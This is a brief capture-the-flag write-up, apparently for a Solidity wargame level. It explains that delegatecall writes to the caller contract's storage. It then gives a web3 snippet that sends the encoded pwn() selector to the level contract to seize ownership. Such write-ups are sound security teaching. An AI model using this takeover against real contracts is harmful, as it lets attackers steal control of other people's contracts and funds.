use of `delegatecall` should be handled very carefully because layout of state
variables of the caller contract are used in the call.
To pass this level, we need to take the ownership of the contract but on first
glance, we can see the owner being set in the contract `Delgate's owner` but this code block passes the contract.

```javascript
let en = web3.eth.abi.encodeFunctionSignature('pwn()');
web3.eth.sendTransaction({from: player, to: contract.address, data: en})
```

This is due to state changes during `delgatecall` are not callee contracts' but the caller contract. Thus, you can claim the ownership of the level instance through the delegatecall.
